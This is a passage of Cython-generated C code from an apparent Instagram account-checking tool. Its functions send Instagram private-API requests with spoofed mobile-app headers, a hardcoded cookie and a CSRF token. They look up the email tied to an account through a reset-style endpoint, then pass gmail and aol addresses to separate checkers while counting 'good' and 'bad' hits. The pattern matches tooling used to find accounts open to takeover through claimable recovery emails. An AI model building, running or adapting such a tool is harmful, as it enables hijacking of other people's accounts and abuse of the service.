  if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 509, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
  __pyx_t_6 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyUnicode_Type)), __pyx_t_3); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 509, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = PyUnicode_AsEncodedString(((PyObject*)__pyx_t_6), NULL, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 509, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
  __pyx_t_6 = NULL;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_4))) {
    __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_4);
    if (likely(__pyx_t_6)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
      __Pyx_INCREF(__pyx_t_6);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_4, function);
    }
  }
  __pyx_t_2 = (__pyx_t_6) ? __Pyx_PyObject_Call2Args(__pyx_t_4, __pyx_t_6, __pyx_t_3) : __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_t_3);
  __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 509, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_hexdigest); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 509, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = NULL;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_4))) {
    __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_4);
    if (likely(__pyx_t_2)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
      __Pyx_INCREF(__pyx_t_2);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_4, function);
    }
  }
  __pyx_t_1 = (__pyx_t_2) ? __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_t_2) : __Pyx_PyObject_CallNoArg(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 509, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_4 = __Pyx_PyObject_GetSlice(__pyx_t_1, 0, 16, NULL, NULL, &__pyx_slice__45, 0, 1, 1); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 509, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = PyNumber_Add(__pyx_v_dev, __pyx_t_4); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 509, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_v_device_id = __pyx_t_1;
  __pyx_t_1 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_uuid); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 510, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_uuid4); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 510, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_4 = NULL;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_2))) {
    __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_2);
    if (likely(__pyx_t_4)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
      __Pyx_INCREF(__pyx_t_4);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_2, function);
    }
  }
  __pyx_t_1 = (__pyx_t_4) ? __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_t_4) : __Pyx_PyObject_CallNoArg(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
  if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 510, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyUnicode_Type)), __pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 510, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_v_uui = __pyx_t_2;
  __pyx_t_2 = 0;

  
  __pyx_t_2 = __Pyx_PyDict_NewPresized(3); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 512, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_t_2, __pyx_kp_u_User_Agent, __pyx_v_ua) < 0) __PYX_ERR(0, 512, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_2, __pyx_n_u_Cookie, __pyx_kp_u_mid_ZVfGvgABAAGoQqa7AY3mgoYBV1nP) < 0) __PYX_ERR(0, 512, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_2, __pyx_kp_u_Content_Type, __pyx_kp_u_application_x_www_form_urlencode_2) < 0) __PYX_ERR(0, 512, __pyx_L1_error)
  __pyx_v_headers = ((PyObject*)__pyx_t_2);
  __pyx_t_2 = 0;

  
  __pyx_t_2 = __Pyx_PyDict_NewPresized(2); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 517, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_json); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 517, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_dumps); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 517, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

  
  __pyx_t_4 = __Pyx_PyDict_NewPresized(5); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 518, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  if (PyDict_SetItem(__pyx_t_4, __pyx_n_u_csrftoken, __pyx_kp_u_9y3N5kLqzialQA7z96AMiyAKLMBWpqVj) < 0) __PYX_ERR(0, 518, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_t_4, __pyx_n_u_adid, __pyx_v_uui) < 0) __PYX_ERR(0, 518, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_t_4, __pyx_n_u_guid, __pyx_v_uui) < 0) __PYX_ERR(0, 518, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_t_4, __pyx_n_u_device_id, __pyx_v_device_id) < 0) __PYX_ERR(0, 518, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_t_4, __pyx_n_u_query, __pyx_v_email) < 0) __PYX_ERR(0, 518, __pyx_L1_error)
  __pyx_t_6 = NULL;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_3))) {
    __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_3);
    if (likely(__pyx_t_6)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
      __Pyx_INCREF(__pyx_t_6);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_3, function);
    }
  }
  __pyx_t_1 = (__pyx_t_6) ? __Pyx_PyObject_Call2Args(__pyx_t_3, __pyx_t_6, __pyx_t_4) : __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_4);
  __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 517, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  
  __pyx_t_3 = PyNumber_Add(__pyx_kp_u_0d067c2f86cac2c17d655631c9cec240, __pyx_t_1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 517, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  if (PyDict_SetItem(__pyx_t_2, __pyx_n_u_signed_body, __pyx_t_3) < 0) __PYX_ERR(0, 517, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  if (PyDict_SetItem(__pyx_t_2, __pyx_n_u_ig_sig_key_version, __pyx_kp_u_4) < 0) __PYX_ERR(0, 517, __pyx_L1_error)
  __pyx_v_data = ((PyObject*)__pyx_t_2);
  __pyx_t_2 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_requests); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 526, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_post); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 526, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = __Pyx_PyDict_NewPresized(2); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 528, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_t_2, __pyx_n_s_headers, __pyx_v_headers) < 0) __PYX_ERR(0, 528, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_t_2, __pyx_n_s_data, __pyx_v_data) < 0) __PYX_ERR(0, 528, __pyx_L1_error)

  
  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_tuple__46, __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 526, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_text); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 529, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_v_response = __pyx_t_2;
  __pyx_t_2 = 0;

  
  __pyx_t_7 = (__Pyx_PySequence_ContainsTF(__pyx_v_email, __pyx_v_response, Py_EQ)); if (unlikely(__pyx_t_7 < 0)) __PYX_ERR(0, 530, __pyx_L1_error)
  __pyx_t_8 = (__pyx_t_7 != 0);
  if (__pyx_t_8) {

    
    __pyx_t_8 = (__Pyx_PySequence_ContainsTF(__pyx_kp_u_gmail_com, __pyx_v_email, Py_EQ)); if (unlikely(__pyx_t_8 < 0)) __PYX_ERR(0, 531, __pyx_L1_error)
    __pyx_t_7 = (__pyx_t_8 != 0);
    if (__pyx_t_7) {

      
      __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_check_gmail); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 532, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_1);
      __pyx_t_3 = NULL;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_1))) {
        __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_1);
        if (likely(__pyx_t_3)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
          __Pyx_INCREF(__pyx_t_3);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_1, function);
        }
      }
      __pyx_t_2 = (__pyx_t_3) ? __Pyx_PyObject_Call2Args(__pyx_t_1, __pyx_t_3, __pyx_v_email) : __Pyx_PyObject_CallOneArg(__pyx_t_1, __pyx_v_email);
      __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
      if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 532, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

      
      goto __pyx_L4;
    }

    
    __pyx_t_8 = (__Pyx_PySequence_ContainsTF(__pyx_kp_u_aol_com, __pyx_v_email, Py_EQ)); if (unlikely(__pyx_t_8 < 0)) __PYX_ERR(0, 533, __pyx_L1_error)
    __pyx_t_9 = (__pyx_t_8 != 0);
    if (!__pyx_t_9) {
    } else {
      __pyx_t_7 = __pyx_t_9;
      goto __pyx_L5_bool_binop_done;
    }
    __pyx_t_9 = (__Pyx_PySequence_ContainsTF(__pyx_kp_u_a_com, __pyx_v_email, Py_EQ)); if (unlikely(__pyx_t_9 < 0)) __PYX_ERR(0, 533, __pyx_L1_error)
    __pyx_t_8 = (__pyx_t_9 != 0);
    __pyx_t_7 = __pyx_t_8;
    __pyx_L5_bool_binop_done:;
    if (__pyx_t_7) {

      
      __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_check_aol); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 534, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_1);
      __pyx_t_3 = NULL;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_1))) {
        __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_1);
        if (likely(__pyx_t_3)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
          __Pyx_INCREF(__pyx_t_3);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_1, function);
        }
      }
      __pyx_t_2 = (__pyx_t_3) ? __Pyx_PyObject_Call2Args(__pyx_t_1, __pyx_t_3, __pyx_v_email) : __Pyx_PyObject_CallOneArg(__pyx_t_1, __pyx_v_email);
      __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
      if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 534, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

      
    }
    __pyx_L4:;

    
    __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_goodig); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 535, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __pyx_t_1 = __Pyx_PyInt_AddObjC(__pyx_t_2, __pyx_int_1, 1, 1, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 535, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    if (PyDict_SetItem(__pyx_d, __pyx_n_s_goodig, __pyx_t_1) < 0) __PYX_ERR(0, 535, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

    
    __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_pppp); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 536, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __pyx_t_3 = NULL;
    if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_2))) {
      __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_2);
      if (likely(__pyx_t_3)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
        __Pyx_INCREF(__pyx_t_3);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_2, function);
      }
    }
    __pyx_t_1 = (__pyx_t_3) ? __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_t_3) : __Pyx_PyObject_CallNoArg(__pyx_t_2);
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 536, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

    
    goto __pyx_L3;
  }

  
  /*else*/ {
    __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_badinsta); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 538, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __pyx_t_2 = __Pyx_PyInt_AddObjC(__pyx_t_1, __pyx_int_1, 1, 1, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 538, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    if (PyDict_SetItem(__pyx_d, __pyx_n_s_badinsta, __pyx_t_2) < 0) __PYX_ERR(0, 538, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

    
    __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_pppp); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 539, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __pyx_t_3 = NULL;
    if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_1))) {
      __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_1);
      if (likely(__pyx_t_3)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
        __Pyx_INCREF(__pyx_t_3);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_1, function);
      }
    }
    __pyx_t_2 = (__pyx_t_3) ? __Pyx_PyObject_CallOneArg(__pyx_t_1, __pyx_t_3) : __Pyx_PyObject_CallNoArg(__pyx_t_1);
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 539, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  }
  __pyx_L3:;

  

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_XDECREF(__pyx_t_6);
  __Pyx_AddTraceback("source.check", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_ua);
  __Pyx_XDECREF(__pyx_v_dev);
  __Pyx_XDECREF(__pyx_v_device_id);
  __Pyx_XDECREF(__pyx_v_uui);
  __Pyx_XDECREF(__pyx_v_headers);
  __Pyx_XDECREF(__pyx_v_data);
  __Pyx_XDECREF(__pyx_v_response);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}



/* Python wrapper */
static PyObject *__pyx_pw_6source_23rest(PyObject *__pyx_self, PyObject *__pyx_v_user); /*proto*/
static PyMethodDef __pyx_mdef_6source_23rest = {"rest", (PyCFunction)__pyx_pw_6source_23rest, METH_O, 0};
static PyObject *__pyx_pw_6source_23rest(PyObject *__pyx_self, PyObject *__pyx_v_user) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("rest (wrapper)", 0);
  __pyx_r = __pyx_pf_6source_22rest(__pyx_self, ((PyObject *)__pyx_v_user));

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_6source_22rest(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_user) {
  PyObject *__pyx_v_headers = NULL;
  PyObject *__pyx_v_data = NULL;
  PyObject *__pyx_v_response = NULL;
  PyObject *__pyx_v_r = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  PyObject *__pyx_t_6 = NULL;
  PyObject *__pyx_t_7 = NULL;
  int __pyx_t_8;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("rest", 0);

  
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_1, &__pyx_t_2, &__pyx_t_3);
    __Pyx_XGOTREF(__pyx_t_1);
    __Pyx_XGOTREF(__pyx_t_2);
    __Pyx_XGOTREF(__pyx_t_3);
    /*try:*/ {

      
      __pyx_t_4 = __Pyx_PyDict_NewPresized(19); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 545, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_X_Pigeon_Session_Id, __pyx_kp_u_50cc6861_7036_43b4_802e_fb428279) < 0) __PYX_ERR(0, 545, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_X_Pigeon_Rawclienttime, __pyx_kp_u_1700251574_982) < 0) __PYX_ERR(0, 545, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_X_IG_Connection_Speed, __pyx_kp_u_1kbps) < 0) __PYX_ERR(0, 545, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_X_IG_Bandwidth_Speed_KBPS, __pyx_kp_u_1_000) < 0) __PYX_ERR(0, 545, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_X_IG_Bandwidth_TotalBytes_B, __pyx_kp_u_0_2) < 0) __PYX_ERR(0, 545, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_X_IG_Bandwidth_TotalTime_MS, __pyx_kp_u_0_2) < 0) __PYX_ERR(0, 545, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_X_Bloks_Version_Id, __pyx_n_u_c80c5fb30dfae9e273e4009f03b18280) < 0) __PYX_ERR(0, 545, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_X_IG_Connection_Type, __pyx_n_u_WIFI) < 0) __PYX_ERR(0, 545, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_X_IG_Capabilities, __pyx_kp_u_3brTvw) < 0) __PYX_ERR(0, 545, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_X_IG_App_ID, __pyx_kp_u_567067343352427) < 0) __PYX_ERR(0, 545, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_User_Agent, __pyx_kp_u_Instagram_100_0_0_17_129_Android) < 0) __PYX_ERR(0, 545, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_Accept_Language, __pyx_kp_u_en_GB_en_US) < 0) __PYX_ERR(0, 545, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_n_u_Cookie, __pyx_kp_u_mid_ZVfGvgABAAGoQqa7AY3mgoYBV1nP) < 0) __PYX_ERR(0, 545, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_Content_Type, __pyx_kp_u_application_x_www_form_urlencode_2) < 0) __PYX_ERR(0, 545, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_Accept_Encoding, __pyx_kp_u_gzip_deflate) < 0) __PYX_ERR(0, 545, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_n_u_Host, __pyx_kp_u_i_instagram_com) < 0) __PYX_ERR(0, 545, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_X_FB_HTTP_Engine, __pyx_n_u_Liger) < 0) __PYX_ERR(0, 545, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_n_u_Connection, __pyx_kp_u_keep_alive) < 0) __PYX_ERR(0, 545, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_Content_Length, __pyx_kp_u_356) < 0) __PYX_ERR(0, 545, __pyx_L3_error)
      __pyx_v_headers = ((PyObject*)__pyx_t_4);
      __pyx_t_4 = 0;

      
      __pyx_t_4 = __Pyx_PyDict_NewPresized(2); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 566, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __pyx_t_5 = PyNumber_Add(__pyx_kp_u_0d067c2f86cac2c17d655631c9cec240_2, __pyx_v_user); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 566, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __pyx_t_6 = PyNumber_Add(__pyx_t_5, __pyx_kp_u__47); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 566, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      if (PyDict_SetItem(__pyx_t_4, __pyx_n_u_signed_body, __pyx_t_6) < 0) __PYX_ERR(0, 566, __pyx_L3_error)
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      if (PyDict_SetItem(__pyx_t_4, __pyx_n_u_ig_sig_key_version, __pyx_kp_u_4) < 0) __PYX_ERR(0, 566, __pyx_L3_error)
      __pyx_v_data = ((PyObject*)__pyx_t_4);
      __pyx_t_4 = 0;

      
      __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_requests); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 569, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_6, __pyx_n_s_post); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 569, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

      
      __pyx_t_6 = __Pyx_PyDict_NewPresized(2); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 571, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      if (PyDict_SetItem(__pyx_t_6, __pyx_n_s_headers, __pyx_v_headers) < 0) __PYX_ERR(0, 571, __pyx_L3_error)

      
      if (PyDict_SetItem(__pyx_t_6, __pyx_n_s_data, __pyx_v_data) < 0) __PYX_ERR(0, 571, __pyx_L3_error)

      
      __pyx_t_7 = __Pyx_PyObject_Call(__pyx_t_5, __pyx_tuple__46, __pyx_t_6); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 569, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

      
      __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_json); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 573, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __pyx_t_7 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_6))) {
        __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_6);
        if (likely(__pyx_t_7)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
          __Pyx_INCREF(__pyx_t_7);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_6, function);
        }
      }
      __pyx_t_4 = (__pyx_t_7) ? __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_t_7) : __Pyx_PyObject_CallNoArg(__pyx_t_6);
      __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
      if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 573, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_v_response = __pyx_t_4;
      __pyx_t_4 = 0;

      
      __pyx_t_4 = __Pyx_PyObject_Dict_GetItem(__pyx_v_response, __pyx_n_u_email); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 574, __pyx_L3_error)
